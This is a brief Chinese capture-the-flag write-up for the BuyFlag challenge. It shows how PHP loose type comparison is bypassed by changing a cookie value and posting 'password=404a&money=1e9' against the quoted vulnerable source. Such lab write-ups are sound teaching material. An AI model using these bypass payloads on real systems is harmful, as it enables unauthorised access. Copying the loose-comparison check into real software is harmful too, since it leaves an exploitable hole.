# [极客大挑战 2019]BuyFlag

## 知识点

`php弱类型比较`

## 解题

``

更改`Cookie`中的`user`值为`1`

根据源代码的要求

```php
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

传入`password`和`money`

绕过后的`payload`

```
password=404a&money=1e9
```